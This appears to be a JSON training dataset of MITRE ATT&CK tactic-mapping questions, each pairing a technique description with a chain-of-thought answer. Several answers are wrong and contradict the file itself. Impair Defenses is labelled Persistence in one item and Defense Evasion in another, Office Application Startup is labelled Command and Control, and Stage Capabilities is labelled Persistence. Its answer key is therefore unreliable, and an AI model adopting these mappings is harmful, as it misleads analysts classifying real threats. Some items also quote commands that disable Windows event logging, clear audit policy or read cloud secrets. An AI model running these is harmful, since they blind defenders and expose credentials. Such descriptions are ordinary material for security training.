    "instruction": "Which tactic is related to the following description - Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.?",
    "context": "",
    "output": "The given description is related to sub technique Code Signing Certificates (T1587.002);\nSub technique Code Signing Certificates (T1587.002) is a type of technique Develop Capabilities (T1587);\nTechnique Develop Capabilities (T1587) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with. Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to Code Signing, adversaries may develop self-signed code signing certificates for use in operations.",
      "answer": "The given description is related to sub technique Code Signing Certificates (T1587.002);\nSub technique Code Signing Certificates (T1587.002) is a type of technique Develop Capabilities (T1587);\nTechnique Develop Capabilities (T1587) is a type of tactic Resource Development (TA0042);\nTherefore, the given description is related to tactic Resource Development (TA0042).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings. <code>auditpol.exe</code> may also be used to set audit policies.\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>). Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog. Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category. To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
    "context": "",
    "output": "The given description is related to sub technique: Disable Windows Event Logging (T1562.002);\nSub technique Disable Windows Event Logging (T1562.002) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more. This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications. By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings. <code>auditpol.exe</code> may also be used to set audit policies.\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>). Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog. Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category. To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
      "answer": "The given description is related to sub technique: Disable Windows Event Logging (T1562.002);\nSub technique Disable Windows Event Logging (T1562.002) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.?",
    "context": "",
    "output": "The given description is related to sub technique Disable or Modify Cloud Logs (T1562.008);\nSub technique Disable or Modify Cloud Logs (T1562.008) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - An adversary may disable or modify cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection. Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable or modify logging to avoid detection of their activities.\n\nFor example, in AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity. They may alternatively tamper with logging functionality \u2013 for example, by removing any associated SNS topics, disabling multi-region logging, or disabling settings that validate and/or encrypt log files. In Office 365, an adversary may disable logging on mail collection activities for specific users by using the `Set-MailboxAuditBypassAssociation` cmdlet, by disabling M365 Advanced Auditing for the user, or by downgrading the user\u2019s license from an Enterprise E5 to an Enterprise E3 license.",
      "answer": "The given description is related to sub technique Disable or Modify Cloud Logs (T1562.008);\nSub technique Disable or Modify Cloud Logs (T1562.008) is a type of technique Impair Defenses (T1562);\nTechnique Impair Defenses (T1562) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.?",
    "context": "",
    "output": "The given description is related to sub technique: Office Test (T1137.002);\nSub technique Office Test (T1137.002) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may abuse the Microsoft Office \"Office Test\" Registry key to obtain persistence on a compromised system. An Office Test Registry location exists that allows a user to specify an arbitrary DLL that will be executed every time an Office application is started. This Registry key is thought to be used by Microsoft to load DLLs for testing and debugging purposes while developing Office applications. This Registry key is not created by default during an Office installation.\n\nThere exist user and global Registry keys for the Office Test feature, such as:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Office test\\Special\\Perf</code>\n\nAdversaries may add this Registry key and specify a malicious DLL that will be executed whenever an Office application, such as Word or Excel, is started.",
      "answer": "The given description is related to sub technique: Office Test (T1137.002);\nSub technique Office Test (T1137.002) is a type of technique Office Application Startup (T1137);\nTechnique Office Application Startup (T1137) is a type of tactic Command and Control (TA0011);\nTherefore, the given description is related to tactic Command and Control (TA0011).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. \n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.\n\nAdversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary.?",
    "context": "",
    "output": "The given description is related to sub technique Traffic Duplication (T1020.001);\nSub technique Traffic Duplication (T1020.001) is a type of technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. \n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.\n\nAdversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary.",
      "answer": "The given description is related to sub technique Traffic Duplication (T1020.001);\nSub technique Traffic Duplication (T1020.001) is a type of technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is a type of tactic Exfiltration (TA0010);\nTherefore, the given description is related to tactic Exfiltration (TA0010).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe session number to be stolen`, an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected sessions. It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.?",
    "context": "",
    "output": "The given description is related to sub technique: RDP Hijacking (T1563.002);\nSub technique RDP Hijacking (T1563.002) is a type of technique Remote Service Session Hijacking (T1563);\nTechnique Remote Service Session Hijacking (T1563) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may hijack a legitimate user\u2019s remote desktop session to move laterally within an environment. Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).\n\nAdversaries may perform RDP session hijacking which involves stealing a legitimate user's remote session. Typically, a user is notified when someone else is trying to steal their session. With System permissions and using Terminal Services Console, `c:\\windows\\system32\\tscon.exe session number to be stolen`, an adversary can hijack a session without the need for credentials or prompts to the user. This can be done remotely or locally and with active or disconnected sessions. It can also lead to Remote System Discovery and Privilege Escalation by stealing a Domain Admin or higher privileged account session. All of this can be done by using native Windows commands, but it has also been added as a feature in red teaming tools.",
      "answer": "The given description is related to sub technique: RDP Hijacking (T1563.002);\nSub technique RDP Hijacking (T1563.002) is a type of technique Remote Service Session Hijacking (T1563);\nTechnique Remote Service Session Hijacking (T1563) is a type of tactic Lateral Movement (TA0008);\nTherefore, the given description is related to tactic Lateral Movement (TA0008).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> PowerShell cmdlets on Windows systems.\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. \n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).?",
    "context": "",
    "output": "The given description is related to sub technique Email Hiding Rules (T1564.008);\nSub technique Email Hiding Rules (T1564.008) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> PowerShell cmdlets on Windows systems.\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to Internal Spearphishing emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. \n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
      "answer": "The given description is related to sub technique Email Hiding Rules (T1564.008);\nSub technique Email Hiding Rules (T1564.008) is a type of technique Hide Artifacts (T1564);\nTechnique Hide Artifacts (T1564) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
    "context": "",
    "output": "The given description is related to sub technique Encrypted/Encoded File (T1027.013);\nSub technique Encrypted/Encoded File (T1027.013) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may encrypt or encode files to obfuscate strings, bytes, and other specific patterns to impede detection. Encrypting and/or encoding file content aims to conceal malicious artifacts within a file used in an intrusion. Many other techniques, such as Software Packing, Steganography, and Embedded Payloads, share this same broad objective. Encrypting and/or encoding files could lead to a lapse in detection of static signatures, only for this malicious content to be revealed (i.e., Deobfuscate/Decode Files or Information) at the time of execution/use.\n\nThis type of file obfuscation can be applied to many file artifacts present on victim hosts, such as malware log/configuration and payload files. Files can be encrypted with a hardcoded or user-supplied key, as well as otherwise obfuscated using standard encoding/compression schemes such as Base64.\n\nThe entire content of a file may be obfuscated, or just specific functions or values (such as C2 addresses). Encryption and encoding may also be applied in redundant layers for additional protection.\n\nFor example, adversaries may abuse password-protected Word documents or self-extracting (SFX) archives as a method of encrypting/encoding a file such as a Phishing payload. These files typically function by attaching the intended archived content to a decompressor stub that is executed when the file is invoked (e.g., User Execution). \n\nAdversaries may also abuse file-specific as well as custom encoding schemes. For example, Byte Order Mark (BOM) headers in text files may be abused to manipulate and obfuscate file content until Command and Scripting Interpreter execution.",
      "answer": "The given description is related to sub technique Encrypted/Encoded File (T1027.013);\nSub technique Encrypted/Encoded File (T1027.013) is a type of technique Obfuscated Files or Information (T1027);\nTechnique Obfuscated Files or Information (T1027) is a type of tactic Defense Evasion (TA0005);\nTherefore, the given description is related to tactic Defense Evasion (TA0005).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  \n\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  \n\nIf an adversary is able to gain sufficient privileges in a cloud environment \u2013 for example, by obtaining the credentials of high-privileged Cloud Accounts or compromising a service that has permission to retrieve secrets \u2013 they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.\n\n**Note:** this technique is distinct from Cloud Instance Metadata API in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",
    "context": "",
    "output": "The given description is related to sub technique: Cloud Secrets Management Stores (T1555.006);\nSub technique Cloud Secrets Management Stores (T1555.006) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may acquire credentials from cloud-native secret management solutions such as AWS Secrets Manager, GCP Secret Manager, Azure Key Vault, and Terraform Vault.  \n\nSecrets managers support the secure centralized management of passwords, API keys, and other credential material. Where secrets managers are in use, cloud services can dynamically acquire credentials via API requests rather than accessing secrets insecurely stored in plain text files or environment variables.  \n\nIf an adversary is able to gain sufficient privileges in a cloud environment \u2013 for example, by obtaining the credentials of high-privileged Cloud Accounts or compromising a service that has permission to retrieve secrets \u2013 they may be able to request secrets from the secrets manager. This can be accomplished via commands such as `get-secret-value` in AWS, `gcloud secrets describe` in GCP, and `az key vault secret show` in Azure.\n\n**Note:** this technique is distinct from Cloud Instance Metadata API in that the credentials are being directly requested from the cloud secrets manager, rather than through the medium of the instance metadata API.",
      "answer": "The given description is related to sub technique: Cloud Secrets Management Stores (T1555.006);\nSub technique Cloud Secrets Management Stores (T1555.006) is a type of technique Credentials from Password Stores (T1555);\nTechnique Credentials from Password Stores (T1555) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description:\nAdversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",
    "context": "",
    "output": "The given description is related to sub technique: Upload Tool (T1608.002);\nSub technique Upload Tool (T1608.002) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description:\nAdversaries may upload tools to third-party or adversary controlled infrastructure to make it accessible during targeting. Tools can be open or closed source, free or commercial. Tools can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: PsExec). Adversaries may upload tools to support their operations, such as making a tool available to a victim network to enable Ingress Tool Transfer by placing it on an Internet accessible web server.\n\nTools may be placed on infrastructure that was previously purchased/rented by the adversary (Acquire Infrastructure) or was otherwise compromised by them (Compromise Infrastructure). Tools can also be staged on web services, such as an adversary controlled GitHub repo, or on Platform-as-a-Service offerings that enable users to easily provision applications.\n\nAdversaries can avoid the need to upload a tool by having compromised victim machines download the tool directly from a third-party hosting location (ex: a non-adversary controlled GitHub repo), including the original hosting site of the tool.",
      "answer": "The given description is related to sub technique: Upload Tool (T1608.002);\nSub technique Upload Tool (T1608.002) is a type of technique Stage Capabilities (T1608);\nTechnique Stage Capabilities (T1608) is a type of tactic Persistence (TA0003);\nTherefore, the given description is related to tactic Persistence (TA0003).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy",
    "context": "",
    "output": "The given description is related to sub technique NTDS (T1003.003);\nSub technique NTDS (T1003.003) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
      "question": "Which tactic is related to the following description - Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\\NTDS\\Ntds.dit</code> of a domain controller.\n\nIn addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.\n\nThe following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.\n\n* Volume Shadow Copy\n* secretsdump.py\n* Using the in-built Windows tool, ntdsutil.exe\n* Invoke-NinjaCopy",
      "answer": "The given description is related to sub technique NTDS (T1003.003);\nSub technique NTDS (T1003.003) is a type of technique OS Credential Dumping (T1003);\nTechnique OS Credential Dumping (T1003) is a type of tactic Credential Access (TA0006);\nTherefore, the given description is related to tactic Credential Access (TA0006).",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_tactic_mapping_CoT"
    }
  },
  {
    "instruction": "Which tactic is related to the following description - Adversaries may purchase technical information about victims that can be used during targeting. Information about victims may be available for purchase within reputable private sources and databases, such as paid subscriptions to feeds of scan databases or other data aggregation services. Adversaries may also purchase information from less-reputable sources such as dark web or cybercrime blackmarkets.\n\nAdversaries may purchase information about their already identified targets, or use purchased data to discover opportunities for successful breaches. Threat actors may gather various technical details from purchased data, including but not limited to employee contact information, credentials, or specifics regarding a victim\u2019s infrastructure. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: Phishing for Information or Search Open Websites/Domains), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Valid Accounts).",
    "context": "",
    "output": "The given description is related to sub technique Purchase Technical Data (T1597.002);\nSub technique Purchase Technical Data (T1597.002) is a type of technique Search Closed Sources (T1597);\nTechnique Search Closed Sources (T1597) is a type of tactic Reconnaissance (TA0043);\nTherefore, the given description is related to tactic Reconnaissance (TA0043).",
    "category": "MitreFlan",
    "instruction_type": "cot_tactic_mapping_CoT",
    "parsed_raw_data": {
